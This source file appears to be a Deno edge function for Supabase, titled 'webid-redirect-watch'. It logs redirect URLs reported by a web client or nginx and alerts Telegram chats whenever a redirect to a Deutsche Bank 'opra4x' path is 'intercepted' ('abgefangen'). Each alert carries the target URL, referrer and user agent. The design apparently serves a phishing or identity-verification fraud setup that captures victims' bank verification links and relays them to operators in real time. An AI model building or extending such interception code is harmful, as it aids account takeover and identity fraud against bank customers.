import { createClient } from "npm:@supabase/supabase-js@2";
import { buildTelegramMessage } from "../_shared/telegramMessage.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type",
};

const supabase = createClient(
  Deno.env.get("SUPABASE_URL")!,
  Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
  { auth: { persistSession: false } },
);

interface Payload {
  url: string;
  source: string;
  userAgent?: string | null;
  referrer?: string | null;
  path?: string | null;
}

async function sendTelegram(message: string) {
  const botToken = Deno.env.get("TELEGRAM_BOT_TOKEN");
  if (!botToken) return;

  const { data: chats } = await supabase
    .from("telegram_chats")
    .select("chat_id")
    .contains("events", ["webid_redirect_abgefangen"]);

  if (!chats || chats.length === 0) return;

  await Promise.allSettled(
    chats.map((chat: any) =>
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chat.chat_id,
          text: message,
          parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
      })
    ),
  );
}

function hostOf(u: string): string | null {
  try {
    return new URL(u).hostname || null;
  } catch {
    return null;
  }
}

function truncate(v: string | null | undefined, max = 300): string | null {
  if (!v) return null;
  return v.length > max ? v.slice(0, max) + "…" : v;
}

const ALLOWED_PREFIX = "https://www.deutsche-bank.de/opra4x";
const SPAM_SOURCES = new Set([
  "page_leave", "beforeunload", "pagehide", "visibilitychange",
  "popstate", "hashchange", "history_pushState", "history_replaceState",
  "meta_refresh_dynamic",
]);

async function handle(payload: Payload) {
  if (!payload.url || !payload.source) return;

  const isOpra = !SPAM_SOURCES.has(payload.source) && payload.url.startsWith(ALLOWED_PREFIX);

  // Alle Requests protokollieren – OPRA4X mit forwarded=true, Rest nur geloggt
  try {
    await supabase.from("webid_redirect_logs").insert({
      url: truncate(payload.url, 1000),
      source: truncate(payload.source, 100),
      user_agent: truncate(payload.userAgent, 500),
      referrer: truncate(payload.referrer, 500),
      path: truncate(payload.path, 500),
      forwarded: isOpra,
    });
    console.log(`[webid-redirect-watch] source=${payload.source} forwarded=${isOpra} url=${truncate(payload.url, 200)}`);
  } catch (e) {
    console.error("log insert failed", e);
  }

  // Nur OPRA4X-Redirects weiterleiten – clientseitigen Spam verwerfen
  if (!isOpra) return;

  const message = buildTelegramMessage({
    icon: "🔗",
    title: "WebID Redirect abgefangen",
    fields: [
      { icon: "🎯", label: "Ziel", value: truncate(payload.url, 400), bold: true },
      { icon: "🌐", label: "Host", value: hostOf(payload.url) },
      { icon: "🧭", label: "Quelle", value: payload.source },
      { icon: "📄", label: "Pfad", value: truncate(payload.path, 200) },
      { icon: "↩️", label: "Referrer", value: truncate(payload.referrer, 200) },
      { icon: "🖥️", label: "User-Agent", value: truncate(payload.userAgent, 200) },
    ],
  });

  await sendTelegram(message);
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  try {
    let payload: Payload | null = null;

    if (req.method === "GET") {
      const url = new URL(req.url);
      payload = {
        url: url.searchParams.get("target") ?? "",
        source: url.searchParams.get("source") ?? "nginx",
        path: url.searchParams.get("path"),
        userAgent: req.headers.get("user-agent"),
        referrer: req.headers.get("referer"),
      };
    } else if (req.method === "POST") {
      try {
        const body = await req.json();
        payload = {
          url: String(body?.url ?? ""),
          source: String(body?.source ?? "client"),
          userAgent: body?.userAgent ?? req.headers.get("user-agent"),
          referrer: body?.referrer ?? req.headers.get("referer"),
          path: body?.path ?? null,
        };
      } catch {
        // ignore malformed body
      }
    }

    if (payload && payload.url) {
      // fire and forget – but await so Deno keeps the request alive
      await handle(payload).catch((e) => console.error("handle failed", e));
    }
  } catch (e) {
    console.error("webid-redirect-watch error", e);
  }

  return new Response(null, { status: 204, headers: corsHeaders });
});
